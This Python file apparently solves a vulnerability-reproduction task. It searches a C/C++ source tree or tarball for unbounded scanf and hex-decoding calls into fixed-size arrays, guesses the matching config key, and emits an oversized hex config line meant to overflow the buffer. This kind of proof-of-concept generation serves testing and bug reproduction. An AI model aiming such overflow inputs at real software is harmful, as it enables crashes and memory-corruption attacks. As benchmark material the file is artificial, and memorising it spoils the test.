import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


def _safe_decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        try:
            return b.decode("latin-1", "ignore")
        except Exception:
            return ""


def _iter_dir_files(root: str) -> List[Tuple[str, bytes]]:
    out = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                with open(p, "rb") as f:
                    out.append((os.path.relpath(p, root).replace("\\", "/"), f.read()))
            except Exception:
                continue
    return out


def _iter_tar_files(tar_path: str) -> List[Tuple[str, bytes]]:
    out = []
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    out.append((m.name, f.read()))
                except Exception:
                    continue
    except Exception:
        return []
    return out


def _iter_files(src_path: str) -> List[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        return _iter_dir_files(src_path)
    return _iter_tar_files(src_path)


def _is_probably_text(name: str, b: bytes) -> bool:
    if not b:
        return False
    if b"\x00" in b:
        return False
    if len(b) > 2_000_000:
        return False
    ext = os.path.splitext(name.lower())[1]
    if ext in (".png", ".jpg", ".jpeg", ".gif", ".bmp", ".pdf", ".zip", ".gz", ".xz", ".bz2", ".7z", ".exe", ".dll", ".so", ".a"):
        return False
    return True


def _is_source_file(name: str) -> bool:
    ext = os.path.splitext(name.lower())[1]
    return ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")


def _is_candidate_config_file(name: str) -> bool:
    low = name.lower()
    ext = os.path.splitext(low)[1]
    if ext in (".conf", ".cfg", ".ini", ".rc", ".cnf", ".properties"):
        return True
    if any(k in low for k in ("config", "conf", "cfg", "ini", "rc", "settings", "prefs", "preference", "example", "sample")):
        if ext in (".txt", ".example", ".sample", ".in", ".tmpl", ".template", ""):
            return True
    return False


def _split_c_args(s: str) -> List[str]:
    args = []
    cur = []
    depth = 0
    in_str = False
    quote = ""
    esc = False
    i = 0
    while i < len(s):
        ch = s[i]
        if in_str:
            cur.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == quote:
                in_str = False
            i += 1
            continue
        if ch in ("'", '"'):
            in_str = True
            quote = ch
            cur.append(ch)
            i += 1
            continue
        if ch in "([{":
            depth += 1
            cur.append(ch)
            i += 1
            continue
        if ch in ")]}":
            if depth > 0:
                depth -= 1
            cur.append(ch)
            i += 1
            continue
        if ch == "," and depth == 0:
            a = "".join(cur).strip()
            if a:
                args.append(a)
            cur = []
            i += 1
            continue
        cur.append(ch)
        i += 1
    a = "".join(cur).strip()
    if a:
        args.append(a)
    return args


def _unescape_c_string_literal(s: str) -> str:
    out = []
    i = 0
    while i < len(s):
        ch = s[i]
        if ch != "\\":
            out.append(ch)
            i += 1
            continue
        i += 1
        if i >= len(s):
            break
        c = s[i]
        i += 1
        if c == "n":
            out.append("\n")
        elif c == "r":
            out.append("\r")
        elif c == "t":
            out.append("\t")
        elif c == "v":
            out.append("\v")
        elif c == "b":
            out.append("\b")
        elif c == "a":
            out.append("\a")
        elif c == "f":
            out.append("\f")
        elif c == "\\":
            out.append("\\")
        elif c == '"':
            out.append('"')
        elif c == "'":
            out.append("'")
        elif c == "x":
            hx = ""
            while i < len(s) and len(hx) < 2 and s[i] in "0123456789abcdefABCDEF":
                hx += s[i]
                i += 1
            if hx:
                try:
                    out.append(chr(int(hx, 16)))
                except Exception:
                    pass
        elif c.isdigit():
            octd = c
            while i < len(s) and len(octd) < 3 and s[i].isdigit():
                octd += s[i]
                i += 1
            try:
                out.append(chr(int(octd, 8)))
            except Exception:
                pass
        else:
            out.append(c)
    return "".join(out)


_STR_LIT_RE = re.compile(r'(?:L|u8|u|U)?("(?:(?:\\.)|[^"\\])*")')


def _extract_c_string_literal(expr: str) -> Optional[str]:
    parts = _STR_LIT_RE.findall(expr)
    if not parts:
        return None
    joined = ""
    for p in parts:
        if len(p) >= 2 and p[0] == '"' and p[-1] == '"':
            joined += _unescape_c_string_literal(p[1:-1])
    return joined if joined != "" else None


@dataclass
class _Candidate:
    key: Optional[str]
    sep: str  # '=', ':', ' ', or '' when no key
    prefix: str  # e.g. '0x' or ''
    hex_len: int  # number of hex digits (excluding prefix)
    likelihood: int
    est_len: int
    origin: str


def _parse_scanf_format(fmt: str) -> List[Tuple[str, Optional[int], bool, str]]:
    specs = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        i += 1
        if i < n and fmt[i] == "%":
            i += 1
            continue
        suppress = False
        if i < n and fmt[i] == "*":
            suppress = True
            i += 1
        width = None
        w = ""
        while i < n and fmt[i].isdigit():
            w += fmt[i]
            i += 1
        if w:
            try:
                width = int(w)
            except Exception:
                width = None
        if i + 1 < n and fmt[i:i+2] in ("hh", "ll"):
            i += 2
        elif i < n and fmt[i] in ("h", "l", "j", "z", "t", "L"):
            i += 1
        if i >= n:
            break
        conv = fmt[i]
        i += 1
        scanset = ""
        if conv == "[":
            start = i
            if i < n and fmt[i] == "^":
                i += 1
            if i < n and fmt[i] == "]":
                i += 1
            while i < n and fmt[i] != "]":
                i += 1
            if i < n and fmt[i] == "]":
                i += 1
            scanset = fmt[start:i]
        specs.append((conv, width, suppress, scanset))
    return specs


def _extract_var_name(expr: str) -> Optional[str]:
    expr = expr.strip()
    expr = re.sub(r'^\s*&\s*', '', expr)
    m = re.match(r'^([A-Za-z_]\w*)\b', expr)
    if m:
        return m.group(1)
    m = re.search(r'\b([A-Za-z_]\w*)\s*(?:\+|\)|,|$)', expr)
    if m:
        return m.group(1)
    return None


def _build_decl_map(text: str) -> Dict[str, int]:
    decls: Dict[str, int] = {}
    for m in re.finditer(r'\b(?:unsigned\s+char|char|uint8_t|int8_t|u?int8_t)\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]', text):
        var = m.group(1)
        try:
            sz = int(m.group(2))
        except Exception:
            continue
        if 1 <= sz <= 16384:
            prev = decls.get(var)
            if prev is None or sz > prev:
                decls[var] = sz
    return decls


def _find_nearest_strcmp_key(text: str, pos: int) -> Optional[str]:
    window_start = max(0, pos - 4000)
    snippet = text[window_start:pos]
    best = None
    best_pos = -1
    for m in re.finditer(r'\b(?:strc?mp|strn?casecmp)\s*\(\s*[^,]+,\s*(?:L|u8|u|U)?("(?:(?:\\.)|[^"\\])*")', snippet, re.S):
        lit = m.group(1)
        try:
            key = _unescape_c_string_literal(lit[1:-1])
        except Exception:
            continue
        if not key or len(key) > 80:
            continue
        if any(c in key for c in "\n\r\t"):
            continue
        if m.start() > best_pos:
            best_pos = m.start()
            best = key
    return best


def _context_likelihood(ctx: str, fmt: Optional[str], varname: Optional[str], key: Optional[str], origin: str) -> int:
    c = ctx.lower()
    score = 0
    if "config" in c or "cfg" in c or ".conf" in c or "ini" in c:
        score += 4
    if "hex" in c or "isxdigit" in c or "base 16" in c or "strtol" in c or "%02x" in c or "0x" in c:
        score += 7
    if fmt:
        f = fmt.lower()
        if "=" in f:
            score += 2
        if ":" in f:
            score += 1
        if re.search(r'\[[^\]]*(?:0-9|a-f|A-F)[^\]]*\]', fmt):
            score += 5
        if "%x" in f or "%02x" in f or "%hhx" in f:
            score += 2
    if varname:
        v = varname.lower()
        if "hex" in v:
            score += 6
        if any(k in v for k in ("key", "iv", "mac", "salt", "seed", "token", "secret")):
            score += 2
        if "val" in v or "value" in v:
            score += 1
    if key:
        kl = key.lower()
        if any(k in kl for k in ("hex", "key", "iv", "mac", "salt", "seed", "token", "secret")):
            score += 6
        else:
            score += 3
    if "hexcall" in origin:
        score += 6
    return score


def _analyze_sources(files: List[Tuple[str, bytes]]) -> List[_Candidate]:
    candidates: List[_Candidate] = []
    for name, b in files:
        if not _is_source_file(name):
            continue
        if not _is_probably_text(name, b):
            continue
        text = _safe_decode(b)
        if not text:
            continue

        decls = _build_decl_map(text)

        # Scan for scanf-family calls with unbounded %s or %[...] into fixed arrays
        for m in re.finditer(r'\b(sscanf|fscanf|scanf)\s*\(\s*(.{0,600}?)\)\s*;', text, re.S):
            fn = m.group(1)
            argblob = m.group(2)
            args = _split_c_args(argblob)
            if fn == "sscanf":
                if len(args) < 3:
                    continue
                fmt_expr = args[1]
                var_args = args[2:]
            elif fn == "fscanf":
                if len(args) < 3:
                    continue
                fmt_expr = args[1]
                var_args = args[2:]
            else:
                if len(args) < 2:
                    continue
                fmt_expr = args[0]
                var_args = args[1:]
            fmt = _extract_c_string_literal(fmt_expr)
            if not fmt:
                continue

            specs = _parse_scanf_format(fmt)
            if not specs:
                continue

            need = []
            for conv, width, suppress, scanset in specs:
                if suppress:
                    continue
                if conv == "s":
                    need.append(("s", width, ""))
                elif conv == "[":
                    need.append(("[", width, scanset))

            if not need:
                continue
            if len(var_args) < len([x for x in specs if not x[2] and x[0] != "n"]):
                # Too hard to map precisely; still try by indexing string specs order
                pass

            idx = 0
            for conv, width, scanset in need:
                if idx >= len(var_args):
                    break
                expr = var_args[idx]
                idx += 1
                varname = _extract_var_name(expr)
                if not varname:
                    continue
                sz = decls.get(varname)
                if not sz:
                    continue
                unbounded = width is None
                if not unbounded:
                    continue

                # Filter to hex-related contexts
                ctx = text[max(0, m.start() - 800):min(len(text), m.end() + 800)]
                fmt_is_hexish = bool(re.search(r'\[[^\]]*(?:0-9|a-f|A-F)[^\]]*\]', fmt)) or ("x" in fmt.lower())
                ctx_has_hex = ("hex" in ctx.lower()) or ("isxdigit" in ctx.lower()) or ("0x" in ctx.lower()) or ("base 16" in ctx.lower())
                var_hexish = "hex" in varname.lower()
                if not (fmt_is_hexish or ctx_has_hex or var_hexish):
                    continue

                key = _find_nearest_strcmp_key(text, m.start())

                sep = "=" if "=" in fmt else (":" if ":" in fmt else " ")
                prefix = "0x" if "0x" in fmt.lower() or "0x" in ctx.lower() else ""
                # If scanset is for hex digits, ensure even length for validity
                extra = 4
                hex_len = max(8, sz + 1 + extra)
                if prefix or conv == "[" or fmt_is_hexish or ctx_has_hex:
                    if hex_len % 2 == 1:
                        hex_len += 1

                # Build minimal line length estimate
                if key:
                    if sep == " ":
                        est = len(key) + 1 + len(prefix) + hex_len + 1
                    else:
                        est = len(key) + 1 + len(prefix) + hex_len + 1
                else:
                    est = len(prefix) + hex_len + 1

                likelihood = _context_likelihood(ctx, fmt, varname, key, origin=f"scanf:{fn}")
                candidates.append(_Candidate(key=key, sep=sep if key else "", prefix=prefix, hex_len=hex_len, likelihood=likelihood, est_len=est, origin=f"{name}:{fn}"))

        # Scan for hex conversion calls of the form func(src, dst) where dst is fixed array
        for m in re.finditer(r'\b([A-Za-z_]\w*hex\w*)\s*\(\s*([^,()]{1,200})\s*,\s*([A-Za-z_]\w*)\s*(?:\)\s*;|,\s*[^)]{1,200}\)\s*;)', text, re.S):
            func = m.group(1)
            dst = m.group(3)
            sz = decls.get(dst)
            if not sz:
                continue
            calltxt = m.group(0)
            # Prefer 2-arg versions; if has 3+ args, it might be fixed/safe
            has_more_args = "," in calltxt[calltxt.find(dst) + len(dst):]
            if has_more_args:
                # Still consider but lower likelihood
                pass

            ctx = text[max(0, m.start() - 800):min(len(text), m.end() + 800)]
            if "hex" not in ctx.lower() and "isxdigit" not in ctx.lower() and "0x" not in ctx.lower():
                continue

            key = _find_nearest_strcmp_key(text, m.start())
            sep = "="
            prefix = ""
            extra = 2
            # Need hex digits to decode to > sz bytes (2 digits per byte)
            hex_len = 2 * (sz + 1 + extra)
            if hex_len % 2 == 1:
                hex_len += 1
            est = (len(key) + 1 + len(prefix) + hex_len + 1) if key else (len(prefix) + hex_len + 1)
            likelihood = _context_likelihood(ctx, None, dst, key, origin="hexcall") - (2 if has_more_args else 0)
            candidates.append(_Candidate(key=key, sep=sep if key else "", prefix=prefix, hex_len=hex_len, likelihood=likelihood, est_len=est, origin=f"{name}:hexcall:{func}"))
    return candidates


def _find_sample_hex_kv(files: List[Tuple[str, bytes]]) -> Optional[Tuple[str, str, str]]:
    best = None
    best_score = -1
    for name, b in files:
        if _is_source_file(name):
            continue
        if not _is_candidate_config_file(name):
            continue
        if not _is_probably_text(name, b):
            continue
        text = _safe_decode(b)
        if not text:
            continue
        # Look for key = 0x... or key = [0-9A-Fa-f]{8,}
        for m in re.finditer(r'(?m)^\s*([A-Za-z0-9_.-]{1,80})\s*([:=])\s*(0x)?([0-9A-Fa-f]{8,})\s*(?:[#;].*)?$', text):
            key = m.group(1)
            sep = m.group(2)
            prefix = "0x" if m.group(3) else ""
            val = m.group(4)
            score = 0
            lowname = name.lower()
            if any(k in lowname for k in ("sample", "example", "default")):
                score += 3
            if any(k in key.lower() for k in ("hex", "key", "iv", "mac", "salt", "seed", "secret", "token")):
                score += 6
            score += min(5, len(val) // 8)
            if score > best_score:
                best_score = score
                best = (key, sep, prefix)
    return best


def _make_hex(n: int) -> str:
    if n <= 0:
        return ""
    return "A" * n


def _build_poc_line(key: Optional[str], sep: str, prefix: str, hex_len: int) -> bytes:
    hx = _make_hex(hex_len)
    if key:
        if sep == " ":
            s = f"{key} {prefix}{hx}\n"
        elif sep in ("=", ":"):
            s = f"{key}{sep}{prefix}{hx}\n"
        else:
            s = f"{key}={prefix}{hx}\n"
    else:
        s = f"{prefix}{hx}\n"
    return s.encode("ascii", "ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = _iter_files(src_path)
        if not files:
            return (b"hex=" + (b"A" * 600) + b"\n")

        sample = _find_sample_hex_kv(files)
        candidates = _analyze_sources(files)

        chosen: Optional[_Candidate] = None

        if candidates:
            # Prefer candidates that match sample key if available
            if sample:
                skey, ssep, sprefix = sample
                matching = [c for c in candidates if c.key and c.key.lower() == skey.lower()]
                if matching:
                    matching.sort(key=lambda c: (-c.likelihood, c.est_len))
                    chosen = matching[0]
                    chosen = _Candidate(
                        key=skey,
                        sep=ssep,
                        prefix=chosen.prefix or sprefix,
                        hex_len=chosen.hex_len,
                        likelihood=chosen.likelihood + 5,
                        est_len=chosen.est_len,
                        origin=chosen.origin + ":sample-match",
                    )

            if chosen is None:
                candidates.sort(key=lambda c: (-c.likelihood, c.est_len))
                chosen = candidates[0]
                if sample and (not chosen.key):
                    skey, ssep, sprefix = sample
                    chosen = _Candidate(
                        key=skey,
                        sep=ssep,
                        prefix=chosen.prefix or sprefix,
                        hex_len=max(chosen.hex_len, 600),
                        likelihood=chosen.likelihood,
                        est_len=0,
                        origin=chosen.origin + ":sample-key-fallback",
                    )

        if chosen is None:
            if sample:
                skey, ssep, sprefix = sample
                hex_len = 600
                if hex_len % 2 == 1:
                    hex_len += 1
                return _build_poc_line(skey, ssep, sprefix, hex_len)
            return (b"hex=" + (b"A" * 600) + b"\n")

        # Clamp to a sensible range and ensure even length if hex-looking
        hex_len = int(chosen.hex_len)
        if hex_len < 64:
            hex_len = 64
        if hex_len > 4096:
            hex_len = 4096
        if (chosen.prefix or "hex" in (chosen.key or "").lower()) and (hex_len % 2 == 1):
            hex_len += 1

        # If we have a sample key, prefer it when the chosen key is missing/odd
        key = chosen.key
        sep = chosen.sep
        prefix = chosen.prefix
        if sample:
            skey, ssep, sprefix = sample
            if not key or key.lower() in ("hex", "value", "val") or len(key) > 60:
                key, sep = skey, ssep
                if not prefix:
                    prefix = sprefix

        return _build_poc_line(key, sep, prefix, hex_len)